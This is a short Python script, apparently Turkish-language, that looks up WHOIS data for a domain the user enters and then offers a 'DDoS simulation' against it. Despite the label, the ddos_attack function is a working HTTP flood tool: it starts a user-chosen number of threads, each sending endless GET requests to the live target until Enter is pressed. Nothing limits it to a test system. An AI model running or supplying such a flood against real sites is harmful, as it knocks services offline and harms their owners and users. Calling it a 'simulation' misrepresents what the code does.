import whois
import threading
import requests

# Global degisken saldiriya son vermek icin
ddos_running = True

def whois_query(domain_name):
    """Whois sorgusu yapar ve bilgileri ekrana yazar."""
    try:
        domain_info = whois.whois(domain_name)
        print("\nWhois Bilgileri:")
        print("-------------------")
        print("Domain Adi:", domain_info.domain_name)
        print("Kayitci:", domain_info.registrar)
        print("Olusturulma Tarihi:", domain_info.creation_date)
        print("Bitis Tarihi:", domain_info.expiration_date)
        print("Isim Sunuculari:", domain_info.name_servers)
        print("Durum:", domain_info.status)
    except Exception as e:
        print(f"Whois sorgusu basarisiz: {e}")

def ddos_attack(target_url, thread_count):
    """DDoS saldirisini simule eder."""
    def send_request():
        global ddos_running
        try:
            while ddos_running:
                response = requests.get(target_url)
                print(f"HTTP Durum Kodu: {response.status_code}")
        except Exception as e:
            print(f"Hata: {e}")
    
    # Kullaniciya saldiriya son verme mekanizmasi
    def stop_mechanism():
        global ddos_running
        input("\nDDoS saldirisini durdurmak icin ENTER'a basiniz...\n")
        ddos_running = False

    # Threadler baslatiliyor
    threads = []

    # Durma thread'i
    stop_thread = threading.Thread(target=stop_mechanism)
    threads.append(stop_thread)
    stop_thread.start()

    # Istek gonderme thread'leri
    for i in range(thread_count):
        thread = threading.Thread(target=send_request)
        threads.append(thread)
        thread.start()

    # Tum thread'lerin tamamlanmasi bekleniyor
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    print("=== Whois ve DDoS Simulasyonu ===")
    domain = input("Lutfen bir domain adi giriniz (ornek: example.com): ")

    # Whois sorgusu yapiliyor
    whois_query(domain)

    # Kullaniciya DDoS yapmak isteyip istemedigini soruyor
    choice = input("\nBu domain icin DDoS/DOS simulasyonu yapmak istiyor musunuz? (Evet/Hayir): ").strip().lower()
    if choice in ["evet", "e", "yes", "y"]:
        target_url = f"http://{domain}"
        try:
            thread_count = int(input("Kac is parcacigi calistirmak istiyorsunuz? (Ornek: 10-50): "))
            print(f"{target_url} adresine DDoS simulasyonu baslatiliyor...")
            ddos_attack(target_url, thread_count)
        except Exception as e:
            print(f"Hata: {e}")
    else:
        print("DDoS simulasyonu iptal edildi.")
